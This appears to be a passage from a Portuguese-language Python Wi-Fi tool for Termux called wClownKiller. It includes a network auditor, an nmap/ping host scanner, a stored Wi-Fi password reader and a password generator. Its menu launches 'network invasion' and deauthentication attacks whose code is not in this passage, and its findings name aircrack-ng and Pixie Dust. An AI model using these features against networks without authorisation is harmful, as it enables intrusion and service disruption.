        for ssid, pwd in self.saved_passwords.items():
            t.add_row(ssid, pwd)
        
        CONSOLE.print(Panel(t, title="[red]■ Senhas Salvas[/]", border_style="red"))
    
    def add_manual(self):
        ssid = Prompt.ask("[red]■[/] SSID")
        pwd = Prompt.ask("[red]■[/] Senha", password=False)
        self.saved_passwords[ssid] = pwd
        self._save()
        CONSOLE.print("[green]✔ Salvo[/]")
    
    def delete_entry(self):
        self.display_saved_passwords()
        ssid = Prompt.ask("[red]■[/] SSID para remover")
        if ssid in self.saved_passwords:
            del self.saved_passwords[ssid]
            self._save()
            CONSOLE.print("[green]✔ Removido[/]")
        else:
            CONSOLE.print("[red]✘ Não encontrado[/]")
    
    def menu(self):
        while True:
            CONSOLE.print()
            CONSOLE.print("[bold red]■ GERENCIADOR DE SENHAS[/]")
            CONSOLE.print("[red]1[/] Ler senhas do sistema Android (root)")
            CONSOLE.print("[red]2[/] Ver senhas salvas")
            CONSOLE.print("[red]3[/] Adicionar senha manualmente")
            CONSOLE.print("[red]4[/] Remover entrada")
            CONSOLE.print("[red]0[/] Voltar")
            CONSOLE.print()
            c = Prompt.ask("[red]■[/] Escolha", default="0")
            if c == '1':
                self.display_root_passwords()
            elif c == '2':
                self.display_saved_passwords()
            elif c == '3':
                self.add_manual()
            elif c == '4':
                self.delete_entry()
            elif c == '0':
                break
            if c != '0':
                pause()

# ─── Security Auditor ────────────────────────────────────────────────────────
class SecurityAuditor:
    def __init__(self, scanner: WiFiScanner):
        self.scanner = scanner
    
    def analyze_network(self, net: Dict) -> List[Dict]:
        """Return list of findings {severity, finding, detail}."""
        findings = []
        
        sec = net['security'].upper()
        
        if sec == 'OPEN':
            findings.append({
                'sev': 'CRÍTICO',
                'title': 'Rede aberta sem criptografia',
                'detail': 'Todo tráfego é visível. Qualquer sniff captura dados.'
            })
        elif sec == 'WEP':
            findings.append({
                'sev': 'CRÍTICO',
                'title': 'WEP — quebrado em < 60s',
                'detail': 'RC4 com IV estático. aircrack-ng com ~5k IVs resolve.'
            })
        elif 'WPA' in sec and 'WPA2' not in sec and 'WPA3' not in sec:
            findings.append({
                'sev': 'ALTO',
                'title': 'WPA/TKIP — vulnerável',
                'detail': 'TKIP suscetível a ataques de reinjeção. Upgrade para WPA2-AES.'
            })
        elif sec == 'WPA2':
            findings.append({
                'sev': 'MÉDIO',
                'title': 'WPA2 sem PMF',
                'detail': 'Vulnerável a deauth e KRACK. PMF não detectado.'
            })
        
        if net['wps']:
            findings.append({
                'sev': 'ALTO',
                'title': 'WPS ativo',
                'detail': 'Pixie Dust / brute-force de PIN. Desative WPS no roteador.'
            })
        
        if net['signal'] > -40:
            findings.append({
                'sev': 'INFO',
                'title': 'Sinal muito forte',
                'detail': f'RSSI {net["signal"]}dBm — cobertura estende além do perímetro.'
            })
        
        # Channel check: congested channels
        if net['channel'] in [1, 6, 11]:
            findings.append({
                'sev': 'INFO',
                'title': f'Canal {net["channel"]} — padrão',
                'detail': 'Canal previsível. Facilitado targeting por canal fixo.'
            })
        
        if not findings:
            findings.append({
                'sev': 'OK',
                'title': 'Configuração razoável',
                'detail': f'{sec} ativo. Recomenda-se WPA3 e PMF obrigatório.'
            })
        
        return findings
    
    def audit_all(self, nets: List[Dict]):
        for net in nets:
            findings = self.analyze_network(net)
            worst = max(findings, key=lambda f: ['OK','INFO','MÉDIO','ALTO','CRÍTICO'].index(f['sev']))
            
            sev_color = {
                'CRÍTICO': 'bold red',
                'ALTO': 'red',
                'MÉDIO': 'yellow',
                'INFO': 'cyan',
                'OK': 'green'
            }
            
            t = Table(box=box.MINIMAL, border_style="red", show_header=False, expand=True)
            t.add_column("Sev", width=8)
            t.add_column("Achado", style="white")
            
            for f in findings:
                col = sev_color.get(f['sev'], 'white')
                t.add_row(f"[{col}]{f['sev']}[/]", f"{f['title']}\n[dim]{f['detail']}[/]")
            
            CONSOLE.print(Panel(
                t,
                title=f"[red]■ {net['ssid']}[/] [dim]({net['bssid']})[/]",
                border_style=sev_color.get(worst['sev'], 'red')
            ))
    
    def run_audit(self):
        nets = self.scanner.last_scan
        if not nets:
            CONSOLE.print("[dim]■ Executando scan primeiro...[/]")
            self.scanner.scan_and_display()
            nets = self.scanner.last_scan
        if not nets:
            return
        
        CONSOLE.print(f"\n[red]■ Auditando {len(nets)} redes...[/]\n")
        with Progress(
            SpinnerColumn(style="red"),
            TextColumn("[red]■ Analisando...[/]"),
            BarColumn(style="red", complete_style="bold red"),
            TextColumn("{task.percentage:.0f}%"),
            console=CONSOLE
        ) as progress:
            task = progress.add_task("", total=len(nets))
            for net in nets:
                # Simulate analysis time
                time.sleep(0.3)
                progress.advance(task)
        
        CONSOLE.print()
        self.audit_all(nets)

# ─── Vulnerability Analyzer ──────────────────────────────────────────────────
class VulnAnalyzer:
    def __init__(self, scanner: WiFiScanner):
        self.scanner = scanner
    
    def scan_vulnerabilities(self):
        nets = self.scanner.last_scan
        if not nets:
            self.scanner.scan_and_display()
            nets = self.scanner.last_scan
        if not nets:
            return
        
        # Categorize
        open_nets = [n for n in nets if n['security'] == 'OPEN']
        wep_nets = [n for n in nets if n['security'] == 'WEP']
        wps_nets = [n for n in nets if n['wps']]
        weak_nets = [n for n in nets if 'WPA3' not in n['security'].upper() and n['security'] not in ('OPEN', 'WEP')]
        
        # Summary panel
        summary = Table(box=box.SIMPLE, show_header=False, expand=False)
        summary.add_column("K", style="dim")
        summary.add_column("V", style="bold red")
        summary.add_row("Total redes", str(len(nets)))
        summary.add_row("[bold red]ABERTAS (crítico)[/]", str(len(open_nets)))
        summary.add_row("[red]WEP (crítico)[/]", str(len(wep_nets)))
        summary.add_row("[red]WPS ativo[/]", str(len(wps_nets)))
        summary.add_row("[yellow]Sem WPA3[/]", str(len(weak_nets)))
        
        CONSOLE.print(Panel(summary, title="[red]■ VULNERABILIDADES[/]", border_style="red"))
        
        if open_nets:
            CONSOLE.print("\n[bold red]■ REDES ABERTAS — ACESSO LIVRE:[/]")
            for n in open_nets:
                CONSOLE.print(f"  [red]►[/] {n['ssid']} ({n['bssid']}) {signal_strength_bar(n['signal'], 5)}")
        
        if wep_nets:
            CONSOLE.print("\n[bold red]■ WEP — QUEBRADO EM SEGUNDOS:[/]")
            for n in wep_nets:
                CONSOLE.print(f"  [red]►[/] {n['ssid']} ({n['bssid']})")
        
        if wps_nets:
            CONSOLE.print("\n[red]■ WPS ATIVO — PIXIE DUST POSSÍVEL:[/]")
            for n in wps_nets:
                CONSOLE.print(f"  [red]►[/] {n['ssid']} ({n['bssid']}) {security_color(n['security'])}")
        
        # Host scan on current network
        if Confirm.ask("\n[red]■[/] Scan de hosts na rede atual?", default=False):
            self._scan_hosts()
    
    def _scan_hosts(self):
        # Get current network IP
        code, out, _ = run(['ip', 'addr', 'show', CAPS.iface])
        ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', out)
        if not ip_match:
            CONSOLE.print("[red]✘ Não conectado a nenhuma rede[/]")
            return
        
        ip = ip_match.group(1)
        cidr = ip_match.group(2)
        base = '.'.join(ip.split('.')[:3])
        
        CONSOLE.print(f"[dim]■ Scanning {base}.0/{cidr}...[/]")
        
        active_hosts = []
        
        if CAPS.nmap:
            code, out, _ = run(['nmap', '-sn', f'{base}.0/{cidr}', '-T4'], timeout=60)
            for line in out.splitlines():
                if 'Nmap scan report' in line:
                    h = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if h:
                        active_hosts.append({'ip': h.group(1), 'mac': 'N/A', 'vendor': ''})
        else:
            # ARP ping fallback
            with Progress(SpinnerColumn(style="red"), TextColumn("[red]■ ARP scan...[/]"), console=CONSOLE) as p:
                p.add_task("", total=None)
                for i in range(1, 255):
                    host = f"{base}.{i}"
                    code, _, _ = run(['ping', '-c', '1', '-W', '1', host], timeout=2)
                    if code == 0:
                        active_hosts.append({'ip': host, 'mac': self._get_mac(host), 'vendor': ''})
        
        if active_hosts:
            t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style="red", header_style="bold red", expand=True)
            t.add_column("IP", style="white")
            t.add_column("MAC", style="dim red")
            for h in active_hosts:
                t.add_row(h['ip'], h['mac'])
            CONSOLE.print(Panel(t, title=f"[red]■ {len(active_hosts)} hosts ativos[/]", border_style="red"))
        else:
            CONSOLE.print("[dim]■ Nenhum host ativo encontrado[/]")
    
    def _get_mac(self, ip: str) -> str:
        _, out, _ = run(['arp', '-n', ip])
        m = re.search(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', out)
        return m.group(0) if m else 'N/A'

# ─── Password Generator ───────────────────────────────────────────────────────
class PasswordGenerator:
    WORDLIST = [
        'alpha', 'bravo', 'cyber', 'delta', 'echo', 'foxtrot', 'ghost', 'hotel',
        'india', 'jaguar', 'kilo', 'lima', 'mike', 'nova', 'oscar', 'papa',
        'queen', 'romeo', 'sierra', 'tango', 'ultra', 'victor', 'whiskey',
        'xray', 'yankee', 'zulu', 'storm', 'shadow', 'blade', 'void', 'neon',
        'pulse', 'dark', 'void', 'nexus', 'binary', 'crypt', 'glitch', 'static'
    ]
    
    def generate(self, length=16, upper=True, lower=True, digits=True, symbols=True, count=5):
        charset = ''
        if upper: charset += string.ascii_uppercase
        if lower: charset += string.ascii_lowercase
        if digits: charset += string.digits
        if symbols: charset += '!@#$%^&*()_+-=[]{}|;:,.<>?'
        if not charset:
            charset = string.ascii_letters + string.digits
        
        passwords = []
        for _ in range(count):
            # Ensure at least one char from each selected set
            pwd = []
            if upper: pwd.append(random.choice(string.ascii_uppercase))
            if lower: pwd.append(random.choice(string.ascii_lowercase))
            if digits: pwd.append(random.choice(string.digits))
            if symbols: pwd.append(random.choice('!@#$%^&*()_+-='))
            
            remaining = length - len(pwd)
            pwd += random.choices(charset, k=remaining)
            random.shuffle(pwd)
            passwords.append(''.join(pwd))
        
        return passwords
    
    def generate_passphrase(self, words=4, separator='-') -> str:
        return separator.join(random.choices(self.WORDLIST, k=words)) + \
               str(random.randint(10, 99)) + \
               random.choice('!@#$')
    
    def entropy_bits(self, password: str) -> float:
        charset_size = 0
        if any(c in string.ascii_lowercase for c in password): charset_size += 26
        if any(c in string.ascii_uppercase for c in password): charset_size += 26
        if any(c in string.digits for c in password): charset_size += 10
        if any(c in string.punctuation for c in password): charset_size += 32
        if charset_size == 0: return 0
        import math
        return len(password) * math.log2(charset_size)
    
    def strength_label(self, bits: float) -> str:
        if bits < 40: return "[red]FRACA[/]"
        if bits < 60: return "[yellow]RAZOÁVEL[/]"
        if bits < 80: return "[cyan]BOA[/]"
        return "[green]FORTE[/]"
    
    def menu(self):
        while True:
            CONSOLE.print()
            CONSOLE.print("[bold red]■ GERADOR DE SENHAS[/]")
            CONSOLE.print("[red]1[/] Senha aleatória (padrão)")
            CONSOLE.print("[red]2[/] Passphrase mnemônica")
            CONSOLE.print("[red]3[/] Configuração personalizada")
            CONSOLE.print("[red]4[/] Testar força de senha")
            CONSOLE.print("[red]0[/] Voltar")
            CONSOLE.print()
            c = Prompt.ask("[red]■[/] Escolha", default="0")
            
            if c == '1':
                pwds = self.generate()
                t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style="red", header_style="bold red")
                t.add_column("Senha", style="bold red")
                t.add_column("Entropia", style="dim")
                t.add_column("Força")
                for p in pwds:
                    bits = self.entropy_bits(p)
                    t.add_row(p, f"{bits:.0f}b", self.strength_label(bits))
                CONSOLE.print(Panel(t, title="[red]■ Senhas Geradas[/]", border_style="red"))
            
            elif c == '2':
                phrases = [self.generate_passphrase() for _ in range(5)]
                t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style="red", header_style="bold red")
                t.add_column("Passphrase", style="bold red")
                t.add_column("Entropia")
                for p in phrases:
                    bits = self.entropy_bits(p)
                    t.add_row(p, f"{bits:.0f}b")
                CONSOLE.print(Panel(t, title="[red]■ Passphrases[/]", border_style="red"))
            
            elif c == '3':
                try:
                    length = IntPrompt.ask("[red]■[/] Comprimento", default=20)
                    upper = Confirm.ask("[red]■[/] Maiúsculas?", default=True)
                    lower = Confirm.ask("[red]■[/] Minúsculas?", default=True)
                    digits = Confirm.ask("[red]■[/] Dígitos?", default=True)
                    symbols = Confirm.ask("[red]■[/] Símbolos?", default=True)
                    count = IntPrompt.ask("[red]■[/] Quantidade", default=5)
                    pwds = self.generate(length, upper, lower, digits, symbols, count)
                    for p in pwds:
                        bits = self.entropy_bits(p)
                        CONSOLE.print(f"[bold red]{p}[/] [dim]{bits:.0f}b {self.strength_label(bits)}[/]")
                except (ValueError, KeyboardInterrupt):
                    pass
            
            elif c == '4':
                pwd = Prompt.ask("[red]■[/] Digite a senha")
                bits = self.entropy_bits(pwd)
                CONSOLE.print(Panel(
                    f"[red]Senha:[/] {pwd}\n"
                    f"[red]Comprimento:[/] {len(pwd)}\n"
                    f"[red]Entropia:[/] {bits:.1f} bits\n"
                    f"[red]Força:[/] {self.strength_label(bits)}",
                    title="[red]■ Análise de Força[/]", border_style="red"
                ))
            
            elif c == '0':
                break
            
            if c != '0':
                pause()

# ─── Connectivity Tester ─────────────────────────────────────────────────────
class ConnectivityTester:
    PING_HOSTS = [
        ('8.8.8.8', 'Google DNS'),
        ('1.1.1.1', 'Cloudflare DNS'),
        ('8.8.4.4', 'Google DNS 2'),
    ]
    
    def ping_test(self, host: str, count=5) -> Dict:
        code, out, _ = run(['ping', '-c', str(count), '-W', '3', host], timeout=30)
        result = {
            'host': host, 'reachable': code == 0,
            'min': 0.0, 'avg': 0.0, 'max': 0.0, 'loss': 100.0
        }
        if out:
            # Parse rtt min/avg/max
            rtt_match = re.search(r'rtt.*?=\s*([\d.]+)/([\d.]+)/([\d.]+)', out)
            if rtt_match:
                result['min'] = float(rtt_match.group(1))
                result['avg'] = float(rtt_match.group(2))
                result['max'] = float(rtt_match.group(3))
            # Packet loss
            loss_match = re.search(r'(\d+)% packet loss', out)
            if loss_match:
                result['loss'] = float(loss_match.group(1))
        return result
    
    def get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            return s.getsockname()[0]
        except:
            return 'N/A'
    
    def get_connection_info(self) -> Dict:
        info = {}
        # Local IP
        code, out, _ = run(['termux-wifi-connectioninfo'])
        if code == 0 and out.strip():
            try:
                data = json.loads(out)
                info['ssid'] = data.get('ssid', 'N/A')
                info['bssid'] = data.get('bssid', 'N/A')
                info['ip'] = data.get('ip', 'N/A')
                info['speed'] = data.get('link_speed_mbps', 'N/A')
                info['freq'] = data.get('frequency_mhz', 'N/A')
                info['rssi'] = data.get('rssi', 'N/A')
                return info
            except:
                pass
        # Fallback
        info['ip'] = self.get_local_ip()
        _, out, _ = run(['ip', 'route', 'show', 'default'])
        gw_match = re.search(r'via (\S+)', out)
        info['gateway'] = gw_match.group(1) if gw_match else 'N/A'
        return info
    
    def run_full_test(self):
        CONSOLE.print()
        CONSOLE.print("[bold red]■ TESTE DE CONEXÃO[/]\n")
        
        # Connection info
        with CONSOLE.status("[red]■ Coletando info...[/]", spinner_style="red"):
            info = self.get_connection_info()
        
        t = Table(box=box.SIMPLE, show_header=False, expand=False)
        t.add_column("K", style="dim red")
        t.add_column("V", style="white")
        for k, v in info.items():
            t.add_row(k.upper(), str(v))
        CONSOLE.print(Panel(t, title="[red]■ Conexão Atual[/]", border_style="red"))
        
        # Ping tests
        CONSOLE.print("\n[dim red]■ Testando latência...[/]\n")
        ping_t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style="red", header_style="bold red", expand=True)
        ping_t.add_column("Host", style="white")
        ping_t.add_column("Status", width=8)
        ping_t.add_column("Avg (ms)", style="yellow", width=10)
        ping_t.add_column("Loss %", style="dim", width=8)
        
        with Progress(SpinnerColumn(style="red"), TextColumn("[red]■ Pingando...[/]"), console=CONSOLE) as progress:
            task = progress.add_task("", total=len(self.PING_HOSTS))
            for host, label in self.PING_HOSTS:
                r = self.ping_test(host)
                status = "[green]✔[/]" if r['reachable'] else "[red]✘[/]"
                avg = f"{r['avg']:.1f}" if r['reachable'] else "—"
                loss = f"{r['loss']:.0f}%"
                ping_t.add_row(f"{label}\n[dim]{host}[/]", status, avg, loss)
                progress.advance(task)
        
        CONSOLE.print(Panel(ping_t, title="[red]■ Latência[/]", border_style="red"))
        
        # DNS resolution test
        CONSOLE.print("\n[dim red]■ Testando resolução DNS...[/]")
        dns_results = []
        for domain in ['google.com', 'cloudflare.com', 'github.com']:
            start = time.time()
            try:
                ip = socket.gethostbyname(domain)
                elapsed = (time.time() - start) * 1000
                dns_results.append((domain, ip, f"{elapsed:.1f}ms", "[green]✔[/]"))
            except:
                dns_results.append((domain, 'FAIL', '—', "[red]✘[/]"))
        
        dns_t = Table(box=box.MINIMAL, border_style="red", header_style="bold red")
        dns_t.add_column("Domínio", style="white")
        dns_t.add_column("IP", style="dim red")
        dns_t.add_column("Tempo")
        dns_t.add_column("Status", width=6)
        for row in dns_results:
            dns_t.add_row(*row)
        CONSOLE.print(Panel(dns_t, title="[red]■ DNS[/]", border_style="red"))

# ─── Report Engine ────────────────────────────────────────────────────────────
class ReportEngine:
    def __init__(self, scanner: WiFiScanner, auditor: SecurityAuditor):
        self.scanner = scanner
        self.auditor = auditor
    
    def generate_full_report(self):
        if not self.scanner.last_scan:
            CONSOLE.print("[dim]■ Executando scan...[/]")
            self.scanner.scan_and_display()
        
        nets = self.scanner.last_scan
        if not nets:
            CONSOLE.print("[red]✘ Sem dados para relatório[/]")
            return
        
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = REPORTS_DIR / f"report_{ts}.txt"
        
        lines = [
            "=" * 50,
            "    wClownKiller — RELATÓRIO DE AUDITORIA",
            f"    Data: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",
            "=" * 50,
            "",
            f"REDES DETECTADAS: {len(nets)}",
            "",
        ]
        
        # Network table
        lines.append("REDES ESCANEADAS:")
        lines.append("-" * 50)
        lines.append(f"{'#':<4} {'SSID':<20} {'BSSID':<20} {'SIG':<6} {'SEC':<8} {'CH':<4} {'WPS'}")
        for i, n in enumerate(nets, 1):
            lines.append(
                f"{i:<4} {n['ssid'][:19]:<20} {n['bssid']:<20} "
                f"{n['signal']:<6} {n['security']:<8} {n['channel']:<4} {'SIM' if n['wps'] else 'NÃO'}"
            )
        
        lines.append("")
        lines.append("ANÁLISE DE VULNERABILIDADES:")
        lines.append("-" * 50)
        
        for net in nets:
            findings = self.auditor.analyze_network(net)
            lines.append(f"\n[{net['ssid']}] {net['bssid']}")
            for f in findings:
                lines.append(f"  [{f['sev']}] {f['title']}")
                lines.append(f"    → {f['detail']}")
        
        lines.append("")
        lines.append("=" * 50)
        lines.append("FIM DO RELATÓRIO — wClownKiller")
        lines.append("=" * 50)
        
        report_text = '\n'.join(lines)
        report_file.write_text(report_text)
        
        CONSOLE.print(Panel(
            f"[green]✔ Relatório salvo:[/]\n[white]{report_file}[/]",
            title="[red]■ RELATÓRIO GERADO[/]", border_style="red"
        ))
        
        if Confirm.ask("[red]■[/] Exibir resumo?", default=True):
            CONSOLE.print()
            # Summary stats
            open_c = sum(1 for n in nets if n['security'] == 'OPEN')
            wep_c = sum(1 for n in nets if n['security'] == 'WEP')
            wps_c = sum(1 for n in nets if n['wps'])
            
            s = Table(box=box.SIMPLE, show_header=False)
            s.add_column("K", style="dim red")
            s.add_column("V", style="bold red")
            s.add_row("Total redes", str(len(nets)))
            s.add_row("Redes abertas", str(open_c))
            s.add_row("WEP (crítico)", str(wep_c))
            s.add_row("WPS exposto", str(wps_c))
            s.add_row("Relatório", str(report_file))
            
            CONSOLE.print(Panel(s, title="[red]■ Resumo[/]", border_style="red"))

# ─── Main App ─────────────────────────────────────────────────────────────────
class App:
    def __init__(self):
        self.scanner = WiFiScanner()
        self.attack = AttackEngine(self.scanner)
        self.passwords = PasswordManager()
        self.auditor = SecurityAuditor(self.scanner)
        self.vuln = VulnAnalyzer(self.scanner)
        self.generator = PasswordGenerator()
        self.connectivity = ConnectivityTester()
        self.reports = ReportEngine(self.scanner, self.auditor)
    
    def show_menu(self):
        clear()
        show_banner()
        
        root_indicator = "[bold red]◉ ROOT[/]" if CAPS.root else "[dim]○ user[/]"
        
        CONSOLE.print(f"  {root_indicator}  [dim]■[/]  [dim red]{CAPS.iface}[/]")
        CONSOLE.print()
        
        items = [
            ("1", "Scanner Wi-Fi"),
            ("2", "Auditoria de Segurança"),
            ("3", "Gerenciador de Senhas"),
            ("4", "Análise de Vulnerabilidades"),
            ("5", "Gerador de Senhas"),
            ("6", "Teste de Conexão"),
            ("7", "Relatórios"),
            ("8", "Capacidades do Sistema"),
            ("0", "Sair"),
        ]
        
        for key, label in items:
            CONSOLE.print(f"  [bold red]{key}[/]  [white]{label}[/]")
        
        CONSOLE.print()
        CONSOLE.print(Rule(style="dim red"))
    
    def scanner_menu(self):
        while True:
            CONSOLE.print()
            CONSOLE.print("[bold red]■ SCANNER Wi-Fi[/]")
            CONSOLE.print("[red]1[/] Scan passivo (Termux API)")
            CONSOLE.print("[red]2[/] Scan agressivo (iw)")
            CONSOLE.print("[red]3[/] Monitor em tempo real")
            CONSOLE.print("[red]4[/] Invasão de rede")
            CONSOLE.print("[red]5[/] Ataque de rede (Deauth)")
            CONSOLE.print("[red]0[/] Voltar")
            CONSOLE.print()
            c = Prompt.ask("[red]■[/] Escolha", default="0")
            
            if c == '1':
                with CONSOLE.status("[red]■ Termux API scan...[/]", spinner_style="red"):
                    nets = self.scanner.scan_termux_api()
                if nets:
                    self.scanner.last_scan = nets
                    self.scanner._render_table(nets)
                else:
                    CONSOLE.print("[red]✘ Termux API indisponível[/]")
                    CONSOLE.print("[dim]Instale Termux:API + app[/]")
            
            elif c == '2':
                with CONSOLE.status("[red]■ iw scan...[/]", spinner_style="red"):
                    nets = self.scanner.scan_iw()
                if nets:
                    self.scanner.last_scan = nets
                    self.scanner._render_table(nets)
                else:
                    CONSOLE.print("[red]✘ iw scan falhou[/]")
                    CONSOLE.print("[dim]Pode precisar de root[/]")
            
            elif c == '3':
                self._realtime_monitor()
            
            elif c == '4':
                self.attack.invasion_menu()
            
            elif c == '5':
                target = self.scanner.select_target()
                if target:
                    self.attack.deauth_attack(target)
            
            elif c == '0':
                break
            
            if c not in ('0', '4'):
                pause()
    
    def _realtime_monitor(self):
        CONSOLE.print("[dim]Ctrl+C para parar o monitor[/]")
        try:
            while True:
                clear()
                show_banner()
                CONSOLE.print(f"[dim red]{datetime.datetime.now().strftime('%H:%M:%S')} | Ctrl+C para sair[/]\n")
                nets = self.scanner.scan_termux_api()
                if not nets:
                    nets = self.scanner.scan_iw()
                if nets:
                    self.scanner.last_scan = nets
                    self.scanner._render_table(nets)
                else:
                    CONSOLE.print("[dim]■ Aguardando redes...[/]")
                time.sleep(5)
        except KeyboardInterrupt:
            CONSOLE.print("\n[dim]■ Monitor parado[/]")
    
    def run(self):
        # Intro animation
        clear()
        with CONSOLE.status("[red]■ Inicializando wClownKiller...[/]", spinner="bouncingBall", spinner_style="red"):
            time.sleep(1.5)
        
        while True:
            self.show_menu()
            choice = Prompt.ask("[red]■[/] Selecione", default="0")
            
            if choice == '1':
                self.scanner_menu()
            elif choice == '2':
                self.auditor.run_audit()
                pause()
            elif choice == '3':
                self.passwords.menu()
            elif choice == '4':
                self.vuln.scan_vulnerabilities()
                pause()
            elif choice == '5':
                self.generator.menu()
            elif choice == '6':
                self.connectivity.run_full_test()
                pause()
            elif choice == '7':
                self.reports.generate_full_report()
                pause()
            elif choice == '8':
                CAPS.show()
                pause()
            elif choice == '0':
                CONSOLE.print(Panel(
                    "[red]wClownKiller encerrado.[/]",
                    border_style="red"
                ))
                sys.exit(0)

# ─── Entry Point ──────────────────────────────────────────────────────────────
if __name__ == '__main__':
    signal.signal(signal.SIGINT, lambda s, f: (CONSOLE.print("\n[dim]■ Interrompido[/]"), sys.exit(0)))
    try:
        App().run()
    except KeyboardInterrupt:
        CONSOLE.print("\n[dim]■ Saindo...[/]")
        sys.exit(0)
